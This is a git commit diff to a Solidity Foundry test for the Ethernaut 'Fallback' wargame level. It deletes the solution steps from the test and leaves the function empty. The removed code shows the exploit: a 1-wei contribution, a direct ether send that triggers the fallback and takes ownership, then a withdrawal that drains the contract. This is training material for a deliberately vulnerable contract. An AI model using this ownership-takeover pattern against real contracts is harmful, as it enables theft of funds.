b14063332ea5c76ae081b972b47ea6979d4b655b
Mis4nthr0pic <121455563+Mis4nthr0pic@users.noreply.github.com>
2023-07-07 21:30:52 -0300

    Update Fallback.t.sol

--- src/test/Fallback.t.sol
+++ src/test/Fallback.t.sol
@@ -18,41 +18,6 @@ contract FallbackTest is DSTest {
     }
 
     function testFallbackHack() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-
-        FallbackFactory fallbackFactory = new FallbackFactory();
-        ethernaut.registerLevel(fallbackFactory);
-        vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        Fallback ethernautFallback = Fallback(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        // Contribute 1 wei - verify contract state has been updated
-        ethernautFallback.contribute{value: 1 wei}();
-        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);
-
-        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
-        payable(address(ethernautFallback)).call{value: 1 wei}("");
-        // Verify contract owner has been updated to 0 address
-        assertEq(ethernautFallback.owner(), eoaAddress);
-
-        // Withdraw from contract - Check contract balance before and after
-        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
-        ethernautFallback.withdraw();
-        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-        
-
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+     
     }
 }
